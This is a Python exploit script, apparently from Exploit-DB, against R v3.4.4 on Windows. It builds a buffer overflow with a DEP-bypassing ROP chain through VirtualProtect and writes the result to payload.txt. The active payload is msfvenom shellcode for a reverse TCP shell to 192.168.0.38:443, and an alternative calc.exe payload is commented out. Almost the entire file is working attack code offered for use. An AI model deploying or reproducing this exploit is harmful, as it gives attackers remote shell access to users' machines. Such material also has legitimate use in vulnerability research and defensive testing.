# R v3.4.4 (DEP Bypass)
# https://www.exploit-db.com/exploits/44680
#

#!/usr/bin/python

import struct

'''
Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------
'''

'''
#msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -b "\x00\x0a\x0d\x0e" -f python
shellcode =  ""
shellcode += "\xdb\xcc\xd9\x74\x24\xf4\x5b\x53\x59\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37"
shellcode += "\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
shellcode += "\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x39\x78\x4f\x72"
shellcode += "\x37\x70\x63\x30\x65\x50\x45\x30\x6b\x39\x6a\x45\x54"
shellcode += "\x71\x4b\x70\x45\x34\x6c\x4b\x42\x70\x64\x70\x6e\x6b"
shellcode += "\x51\x42\x66\x6c\x6e\x6b\x32\x72\x56\x74\x6c\x4b\x70"
shellcode += "\x72\x47\x58\x66\x6f\x48\x37\x61\x5a\x56\x46\x45\x61"
shellcode += "\x69\x6f\x4c\x6c\x75\x6c\x75\x31\x61\x6c\x65\x52\x64"
shellcode += "\x6c\x37\x50\x6b\x71\x7a\x6f\x66\x6d\x53\x31\x68\x47"
shellcode += "\x5a\x42\x6c\x32\x43\x62\x66\x37\x4c\x4b\x33\x62\x32"
shellcode += "\x30\x4e\x6b\x50\x4a\x45\x6c\x6c\x4b\x52\x6c\x47\x61"
shellcode += "\x42\x58\x4b\x53\x77\x38\x37\x71\x5a\x71\x72\x71\x4e"
shellcode += "\x6b\x43\x69\x51\x30\x75\x51\x78\x53\x6e\x6b\x70\x49"
shellcode += "\x36\x78\x79\x73\x47\x4a\x30\x49\x6e\x6b\x55\x64\x6c"
shellcode += "\x4b\x66\x61\x4e\x36\x55\x61\x6b\x4f\x4e\x4c\x4b\x71"
shellcode += "\x6a\x6f\x66\x6d\x66\x61\x4b\x77\x50\x38\x59\x70\x43"
shellcode += "\x45\x4b\x46\x54\x43\x31\x6d\x4b\x48\x47\x4b\x73\x4d"
shellcode += "\x47\x54\x43\x45\x38\x64\x46\x38\x4c\x4b\x71\x48\x54"
shellcode += "\x64\x67\x71\x4a\x73\x70\x66\x6c\x4b\x34\x4c\x50\x4b"
shellcode += "\x6e\x6b\x66\x38\x47\x6c\x73\x31\x79\x43\x6c\x4b\x36"
shellcode += "\x64\x4e\x6b\x65\x51\x5a\x70\x4d\x59\x51\x54\x76\x44"
shellcode += "\x76\x44\x43\x6b\x33\x6b\x45\x31\x53\x69\x72\x7a\x52"
shellcode += "\x71\x69\x6f\x4d\x30\x61\x4f\x71\x4f\x63\x6a\x6e\x6b"
shellcode += "\x67\x62\x6a\x4b\x4e\x6d\x71\x4d\x42\x4a\x53\x31\x4e"
shellcode += "\x6d\x6c\x45\x4e\x52\x53\x30\x65\x50\x57\x70\x32\x70"
shellcode += "\x45\x38\x34\x71\x4e\x6b\x52\x4f\x4e\x67\x59\x6f\x39"
shellcode += "\x45\x4d\x6b\x38\x70\x38\x35\x39\x32\x62\x76\x63\x58"
shellcode += "\x4c\x66\x4d\x45\x6d\x6d\x6d\x4d\x79\x6f\x7a\x75\x45"
shellcode += "\x6c\x77\x76\x63\x4c\x56\x6a\x4f\x70\x39\x6b\x6b\x50"
shellcode += "\x61\x65\x35\x55\x4d\x6b\x62\x67\x36\x73\x32\x52\x30"
shellcode += "\x6f\x51\x7a\x53\x30\x32\x73\x49\x6f\x48\x55\x42\x43"
shellcode += "\x50\x61\x50\x6c\x32\x43\x76\x4e\x50\x65\x62\x58\x52"
shellcode += "\x45\x37\x70\x41\x41"
'''


#msfvenom -p windows/shell_reverse_tcp -e x86/alpha_mixed -b "\x00\x0a\x0d\x0e" LPORT=443 LHOST=192.168.0.38 -f python
shellcode =  ""
shellcode += "\x89\xe1\xdb\xde\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
shellcode += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
shellcode += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
shellcode += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
shellcode += "\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x4d\x38\x4b\x32"
shellcode += "\x67\x70\x75\x50\x57\x70\x61\x70\x4f\x79\x48\x65\x65"
shellcode += "\x61\x59\x50\x62\x44\x6c\x4b\x30\x50\x76\x50\x6e\x6b"
shellcode += "\x33\x62\x74\x4c\x6e\x6b\x72\x72\x66\x74\x4c\x4b\x44"
shellcode += "\x32\x77\x58\x36\x6f\x68\x37\x70\x4a\x47\x56\x56\x51"
shellcode += "\x4b\x4f\x4e\x4c\x67\x4c\x63\x51\x43\x4c\x43\x32\x74"
shellcode += "\x6c\x77\x50\x5a\x61\x6a\x6f\x54\x4d\x73\x31\x78\x47"
shellcode += "\x68\x62\x39\x62\x62\x72\x51\x47\x6e\x6b\x56\x32\x76"
shellcode += "\x70\x6e\x6b\x62\x6a\x67\x4c\x4c\x4b\x32\x6c\x64\x51"
shellcode += "\x31\x68\x6d\x33\x31\x58\x45\x51\x4b\x61\x73\x61\x6e"
shellcode += "\x6b\x33\x69\x45\x70\x37\x71\x68\x53\x6e\x6b\x32\x69"
shellcode += "\x67\x68\x79\x73\x66\x5a\x77\x39\x6e\x6b\x50\x34\x6e"
shellcode += "\x6b\x66\x61\x58\x56\x44\x71\x4b\x4f\x4c\x6c\x4f\x31"
shellcode += "\x38\x4f\x54\x4d\x75\x51\x6b\x77\x57\x48\x4d\x30\x30"
shellcode += "\x75\x6a\x56\x55\x53\x71\x6d\x69\x68\x37\x4b\x71\x6d"
shellcode += "\x46\x44\x52\x55\x68\x64\x53\x68\x4e\x6b\x62\x78\x37"
shellcode += "\x54\x45\x51\x6e\x33\x63\x56\x4e\x6b\x34\x4c\x30\x4b"
shellcode += "\x6e\x6b\x56\x38\x57\x6c\x36\x61\x4a\x73\x4e\x6b\x74"
shellcode += "\x44\x6e\x6b\x75\x51\x4e\x30\x4b\x39\x32\x64\x51\x34"
shellcode += "\x57\x54\x51\x4b\x31\x4b\x73\x51\x72\x79\x32\x7a\x30"
shellcode += "\x51\x49\x6f\x69\x70\x53\x6f\x61\x4f\x53\x6a\x4c\x4b"
shellcode += "\x44\x52\x58\x6b\x4e\x6d\x61\x4d\x55\x38\x75\x63\x56"
shellcode += "\x52\x35\x50\x43\x30\x73\x58\x53\x47\x73\x43\x50\x32"
shellcode += "\x43\x6f\x31\x44\x30\x68\x32\x6c\x30\x77\x45\x76\x64"
shellcode += "\x47\x79\x6f\x39\x45\x58\x38\x4e\x70\x55\x51\x65\x50"
shellcode += "\x45\x50\x65\x79\x4b\x74\x31\x44\x46\x30\x51\x78\x75"
shellcode += "\x79\x6f\x70\x30\x6b\x47\x70\x49\x6f\x38\x55\x62\x70"
shellcode += "\x42\x70\x32\x70\x32\x70\x57\x30\x72\x70\x77\x30\x42"
shellcode += "\x70\x31\x78\x6a\x4a\x66\x6f\x79\x4f\x69\x70\x69\x6f"
shellcode += "\x68\x55\x6a\x37\x32\x4a\x36\x65\x51\x78\x4b\x70\x6d"
shellcode += "\x78\x57\x70\x77\x56\x70\x68\x75\x52\x33\x30\x67\x71"
shellcode += "\x4f\x4b\x4d\x59\x58\x66\x53\x5a\x56\x70\x36\x36\x62"
shellcode += "\x77\x62\x48\x4f\x69\x4e\x45\x30\x74\x51\x71\x4b\x4f"
shellcode += "\x5a\x75\x4f\x75\x6b\x70\x44\x34\x46\x6c\x4b\x4f\x72"
shellcode += "\x6e\x77\x78\x70\x75\x78\x6c\x70\x68\x4c\x30\x58\x35"
shellcode += "\x6e\x42\x32\x76\x79\x6f\x38\x55\x53\x58\x31\x73\x52"
shellcode += "\x4d\x62\x44\x53\x30\x6d\x59\x38\x63\x52\x77\x63\x67"
shellcode += "\x62\x77\x30\x31\x38\x76\x43\x5a\x65\x42\x32\x79\x70"
shellcode += "\x56\x69\x72\x4b\x4d\x42\x46\x5a\x67\x62\x64\x76\x44"
shellcode += "\x55\x6c\x33\x31\x43\x31\x4c\x4d\x31\x54\x56\x44\x72"
shellcode += "\x30\x7a\x66\x55\x50\x43\x74\x76\x34\x52\x70\x76\x36"
shellcode += "\x46\x36\x51\x46\x71\x56\x46\x36\x50\x4e\x36\x36\x50"
shellcode += "\x56\x42\x73\x76\x36\x75\x38\x73\x49\x4a\x6c\x35\x6f"
shellcode += "\x6c\x46\x6b\x4f\x68\x55\x4e\x69\x4d\x30\x32\x6e\x43"
shellcode += "\x66\x37\x36\x6b\x4f\x66\x50\x43\x58\x47\x78\x6f\x77"
shellcode += "\x65\x4d\x61\x70\x79\x6f\x4b\x65\x6f\x4b\x5a\x50\x4d"
shellcode += "\x65\x6e\x42\x33\x66\x51\x78\x4c\x66\x5a\x35\x4d\x6d"
shellcode += "\x6d\x4d\x49\x6f\x39\x45\x55\x6c\x37\x76\x73\x4c\x76"
shellcode += "\x6a\x6d\x50\x49\x6b\x69\x70\x44\x35\x43\x35\x4f\x4b"
shellcode += "\x70\x47\x75\x43\x31\x62\x70\x6f\x52\x4a\x75\x50\x53"
shellcode += "\x63\x79\x6f\x4a\x75\x41\x41"


#rop chain
rop = struct.pack('<L',0x6fefb794)  # POP EAX # RETN [grDevices.dll 
rop += struct.pack('<L',0x6ff88724) # ptr to &VirtualProtect() [IAT grDevices.dll]
rop += struct.pack('<L',0x6fee2984) # MOV EAX,DWORD PTR DS:[EAX] # RETN [grDevices.dll]
rop += struct.pack('<L', 0x6ca347fa)      # XCHG EAX,ESI # RETN               [R.dll] 
rop += struct.pack('<L',0x6ff1c27f) # POP EBP # RETN [grDevices.dll]
rop += struct.pack('<L', 0x6ca2a9bd)      # & jmp esp                         [R.dll]
rop += struct.pack('<L',0x6fefb794)  # POP EAX # RETN [grDevices.dll] 
rop += struct.pack('<L', 0xfffffaff)      # value to negate, will become 0x00000501
rop += struct.pack('<L',0x6cbe83ba)  # NEG EAX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
rop += struct.pack('<L',0x6cb0d479)  # XCHG EAX,EBX # RETN    ** [R.dll] **  
rop += struct.pack('<L',0x6fefb794)  # POP EAX # RETN [grDevices.dll] 
rop += struct.pack('<L', 0xffffffc0)      # Value to negate, will become 0x00000040
rop += struct.pack('<L',0x6cbe83ba)  # NEG EAX # RETN    ** [R.dll] **   |   {PAGE_EXECUTE_READ}
rop += struct.pack('<L',0x6ca3485a)  # XCHG EAX,EDX # RETN    ** [R.dll] **
rop += struct.pack('<L',0x6c996ce3)  # POP ECX # RETN    ** [R.dll] **
rop += struct.pack('<L', 0x6ff863c1)      # &Writable location                [grDevices.dll]
rop += struct.pack('<L', 0x6cbe097f)      # POP EDI # RETN                    [R.dll] 
rop += struct.pack('<L', 0x6375fe5c)      # RETN (ROP NOP)                    [Rgraphapp.dll]
rop += struct.pack('<L',0x6fefb794)  # POP EAX # RETN [grDevices.dll]
rop += struct.pack('<L', 0x90909090)      # nop
rop += struct.pack('<L',0x6ff11558) # PUSHAD # RETN [grDevices.dll] 


#bad:
#\x00\x01\x0a\x0d
nopsled = '\x90' * 50
buffer = 'A'* 292 + struct.pack('<L',0x6fef93c6) +  'B'*4 + rop + nopsled + shellcode + 'C'*(5000-292-4-4-len(rop)-len(nopsled)-len(shellcode)) 

try:
	f=open('payload.txt','w')
	print '[+] Creating %s bytes evil payload..' %len(buffer)
	f.write(buffer)
	f.close()
	print '[+] File created!'
except Exception as e:
	print e